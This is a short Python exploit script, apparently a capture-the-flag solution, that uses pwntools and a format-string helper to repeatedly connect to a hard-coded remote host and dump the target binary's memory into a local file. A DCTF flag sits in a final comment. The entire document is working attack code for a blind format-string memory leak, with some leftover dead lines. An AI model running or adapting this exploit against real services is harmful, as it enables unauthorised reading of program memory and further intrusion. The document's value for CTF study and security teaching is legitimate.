from pwn import *
from FMT import *
import time

base = 0x804a000
final = 0x804b000+1

def exec_fmt(payload):
    io = remote("206.81.24.129",1337)
    io.recvuntil("Enter username:")
    io.sendline(payload)
    io.sendline("-")
    o = io.recvuntil("access!")
    io.close()
    return o

def leak_binary(address):
    io = remote("206.81.24.129",1337)
    io.recvuntil("Enter username:")

    fmt = FMT(exec_fmt, 32, offset = 41, padding = 0, marker = "rrrr")
    payload = fmt.leak(address)
    if "\x0a" in payload:
        content = "\x00"
    else:

        io.sendline(payload)
        io.sendline("-")
        io.recvuntil("rrrr")
        content = io.recvuntil("RRRR")[:-4] + "\x00"

    log.info("{} -> {}".format(hex(address), content))
    with open("leak", "a") as f:
        f.write(content)
    io.close()
    return len(content)



    io.interactive()
    io.close()


while base != final:
    base += leak_binary(base)
    time.sleep(0.3)


#DCTF{BD8C664E74EB942225EFB74CFD76EC4B2FDA0C37A2D567B707AA1407781FF77F}
